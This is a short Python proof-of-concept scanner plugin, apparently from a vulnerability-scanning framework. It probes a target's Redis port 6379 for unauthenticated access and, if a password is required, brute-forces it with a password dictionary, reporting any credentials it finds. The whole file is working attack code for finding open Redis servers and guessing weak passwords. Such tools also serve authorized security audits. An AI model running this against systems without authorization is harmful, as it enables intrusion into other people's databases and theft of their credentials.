# -*- coding: utf-8 -*-
import socket
from plugin.util import host2IP
from lib.core.settings import TIMEOUT
from data.info_dict import PASSWORD_DIC,REDIS_UNAUTH_KEYWORD,REDIS_AUTH_KEYWORD


def poc(url):
    """
    先检测空口令再检测弱口令
    """
    bakurl = url
    ip = host2IP(url)
    port = 6379

    payload = 'INFO\r\n'
    s = socket.socket()
    socket.setdefaulttimeout(TIMEOUT)
    try:
        host = ip.split(':')[0]
        s.connect((host, port))
        s.send(payload)
        recvdata = s.recv(1024)
        s.close()
        if recvdata:
            if REDIS_UNAUTH_KEYWORD in recvdata:
                return '[redis-unauth] ' + bakurl + ' ' + host
            elif REDIS_AUTH_KEYWORD in recvdata:
                for pass_ in PASSWORD_DIC:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, port))
                    s.send("AUTH %s\r\n" %(pass_))
                    result = s.recv(1024)
                    s.close()
                    if result and '+OK' in result:
                        return '[redis-weakpass] ' + bakurl + ' ' + host + ' PASS:' + str(pass_)
    except Exception:
        pass
    return False
